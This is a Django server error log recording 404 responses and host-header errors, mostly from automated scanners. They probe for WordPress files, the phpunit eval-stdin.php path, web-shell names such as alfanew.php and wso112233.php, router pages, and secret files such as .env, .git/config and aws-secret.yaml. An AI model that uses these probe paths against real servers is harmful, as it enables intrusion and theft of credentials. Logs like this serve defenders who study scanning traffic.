Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /index.html
Not Found: /robots.txt
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /youtube-video-downloader/index.html/
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /login.rsp
Not Found: /archivarix.cms.php
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /manager/html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /youtube-video-downloader/contact.html/
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /scripts/dev/.git/config
Not Found: /server/backup/.git/config
Not Found: /user_backend/.git/config
Not Found: /lib/js/.git/config
Not Found: /releases/.git/config
Not Found: /prod/config/.git/config
Not Found: /dashboard/.git/config
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /xmlrpc.php
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /robots.txt
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /libs/js/iframe.js
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /login.rsp
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /sendgrid/.env
Forbidden (CSRF cookie not set.): /
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /youtube-video-downloader/contact.html/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /contact.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /robots.txt
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /ReportServer
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /cgi-bin/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /.well-known/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /local/
Not Found: /modules/
Not Found: /Site/
Not Found: /system/
Not Found: /template/
Not Found: /shop/
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/css/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /wp-includes/rest-api/search/
Not Found: /wp-includes/Requests/Exception/
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/sodium_compat/src/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-includes/Text/Diff/Engine/Engine/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/html-api/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/images/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/js/
Not Found: /wp-includes/php-compat/
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/random_compat/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/sitemaps/
Not Found: /wp-includes/sodium_compat/
Not Found: /wp-includes/style-engine/
Not Found: /wp-includes/Text/
Not Found: /wp-includes/theme-compat/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/colors/ectoplasm/
Not Found: /wp-admin/css/colors/
Not Found: /sites/default/files/
Not Found: /modules/mod_simplefileuploadv1.3/elements/
Not Found: /components/
Not Found: /wp-includes/js/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/
Not Found: /wp-admin/images/
Not Found: /wp-admin/maint/
Not Found: /wp-admin/meta/
Not Found: /wp-admin/network/
Not Found: /wp-admin/user/
Not Found: /wp-content/
Not Found: /wp-content/plugins/
Not Found: /wp-content/themes/
Not Found: /wp-admin/includes/
Not Found: /wp-admin/
Not Found: /wp-content/upgrade/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/index
Not Found: /robots.txt
Not Found: /Blogs/contact.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /sandbox/.git/config
Not Found: /backup/.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /contact.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /wp.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /index.php
Not Found: /admin-post.php
Not Found: /about.php
Not Found: /wp-admin/repeater.php
Not Found: /wp-content/themes/kadence/functions.php
Not Found: /wp-consar.php
Not Found: /.well-known/acme-challenge/admin.php
Not Found: /dropdown.php
Not Found: /install.php
Not Found: /alfanew2.php7
Not Found: /admin.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /wp-admin.php
Not Found: /404.php
Not Found: /wp-content/uploads/index.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-content/banners/about.php
Not Found: /xx.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /images/xmrlpc.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-content/db-cache.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /blog.php
Not Found: /index/function.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /inputs.php
Not Found: /wp-content/index.php
Not Found: /repeater.php
Not Found: /bypass.php
Not Found: /edit.php
Not Found: /.well-known/about.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /img/cloud.php
Not Found: /libraries/vendor/updates.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /in.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /libraries/legacy/updates.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /alfanew.php
Not Found: /ws.php7
Not Found: /alfanew.php7
Not Found: /packed.php
Not Found: /wp-load.php
Not Found: /wp-content/plugins/about.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /wp-activate.php
Not Found: /ini.php
Not Found: /wp-includes/css/index.php
Not Found: /upfile.php
Not Found: /images/cloud.php
Not Found: /wp-content/plugins/google-seo-rank/module.php
Not Found: /wp-includes/ID3/about.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /wp-conflg.php
Not Found: /plugins.php
Not Found: /ws.php
Not Found: /wso112233.php
Not Found: /moon.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-content/updates.php
Not Found: /wp-includes/about.php
Not Found: /wp-admin/images/Mhbgf.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /xmrlpc.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/themes/twentythirteen/functions.php
Not Found: /wp-admin/cloud.php
Not Found: /wp-cron.php
Not Found: /css/cloud.php
Not Found: /wp-admin/images/about.php
Not Found: /wzy.php
Not Found: /ebs.php7
Not Found: /img/xmrlpc.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /wp-includes/pomo/about.php
Not Found: /.well-known/index.php
Not Found: /wp-includes/assets/index.php
Not Found: /simple.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-admin/dropdown.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /makeasmtp.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-admin/css/index.php
Not Found: /content.php
Not Found: /wp-admin/classwithtostring.php
Not Found: /wp-content/themes/twentytwenty/functions.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /alfa-rex2.php7
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /ae.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /1.php
Not Found: /cong.php
Not Found: /wp-content/themes/too.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/maint/index.php
Not Found: /themes.php
Not Found: /wp-signup.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-content/repeater.php
Not Found: /radio.php
Not Found: /wp-content/updraft/about.php
Not Found: /css/xmrlpc.php
Not Found: /wp-includes/IXR/index.php
Not Found: /epinyins.php
Not Found: /wp-p.php7
Not Found: /cgi-bin/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-sigunq.php
Not Found: /mah.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /alfa-rex.php7
Not Found: /.well-known/acme-challenge/index.php
Not Found: /wp-content/about.php
Not Found: /about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /mail.php
Not Found: /adminfuns.php7
Not Found: /as.php
Not Found: /wp-trackback.php
Not Found: /wp-admin/images/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/network/cloud.php
Not Found: /wp-comments-post.php
Not Found: /updates.php
Not Found: /css.php
Not Found: /wp-mail.php
Not Found: /wp-content/themes/oceanwp/functions.php
Not Found: /cloud.php
Not Found: /nf_tracking.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-blog-header.php
Not Found: /wp-content/themes/twentyeleven/functions.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /bak.php
Not Found: /wp-content/languages/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /avaa.php
Not Found: /images/about.php
Not Found: /wp-content/admin.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /img/about.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/user/cloud.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-login.php
Not Found: /wp-includes/fonts/about.php
Not Found: /classsmtps.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/plugins/admin.php
Not Found: /wp-2019.php/chosen.php
Not Found: /geju.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /classwithtostring.php
Not Found: /wp-includes/IXR/about.php
Not Found: /log.php
Not Found: /wp-includes/widgets/about.php
Not Found: /hoot.php
Not Found: /wp-content/plugins/index.php
Not Found: /wp-includes/Text/index.php
Not Found: /shell.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /post.php
Not Found: /xmlrpc.php
Not Found: /403.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /berlin.php
Not Found: /wp-content/packed.php
Not Found: /about.php7
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-admin/includes/about.php
Not Found: /fw.php
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /index.html
Not Found: /login.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /Blogs/index.html
Not Found: /asp/GetRandCount.asp
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /contact/contact.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /sendgrid/.env
Forbidden (CSRF cookie not set.): /
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /.env
Not Found: /phpinfo
Not Found: /phpinfo.php
Not Found: /portal/.env
Not Found: /env/.env
Not Found: /api/.env
Not Found: /app/.env
Not Found: /dev/.env
Not Found: /new/.env
Not Found: /new/.env.local
Not Found: /new/.env.production
Not Found: /new/.env.staging
Not Found: /_phpinfo.php
Not Found: /_profiler/phpinfo
Not Found: /_profiler/phpinfo/info.php
Not Found: /_profiler/phpinfo/phpinfo.php
Not Found: /wp-config
Not Found: /aws-secret.yaml
Not Found: /awstats/.env
Not Found: /conf/.env
Not Found: /cron/.env
Not Found: /www/.env
Not Found: /docker/.env
Not Found: /docker/app/.env
Not Found: /env.backup
Not Found: /xampp/phpinfo.php
Not Found: /lara/info.php
Not Found: /lara/phpinfo.php
Not Found: /laravel/info.php
Not Found: /.vscode/.env
Not Found: /js/.env
Not Found: /laravel/.env
Not Found: /laravel/core/.env
Not Found: /mail/.env
Not Found: /mailer/.env
Not Found: /nginx/.env
Not Found: /public/.env
Not Found: /site/.env
Not Found: /xampp/.env
Not Found: /.docker/laravel/app/.env
Not Found: /laravel/.env.local
Not Found: /laravel/.env.production
Not Found: /laravel/.env.staging
Not Found: /laravel/core/.env.local
Not Found: /laravel/core/.env.production
Not Found: /laravel/core/.env.staging
Not Found: /main/.env
Not Found: /node_modules/.env
Not Found: /libs/js/iframe.js
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /boaform/admin/formLogin
Not Found: /contact/index.html
Not Found: /wp
Not Found: /wordpress
Not Found: /synersoft
Not Found: /wordpress
Not Found: /old
Not Found: /backup
Not Found: /new
Not Found: /test
Not Found: /wp
Not Found: /temp
Not Found: /blog
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /.git/config
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.git/HEAD
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /vendor/phpunit/phpunit/phpunit.xml
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /webui/
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /robots.txt
Not Found: /geoserver/web/
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /app/frontend/.git/config
Not Found: /data/private/.git/config
Not Found: /devops/.git/config
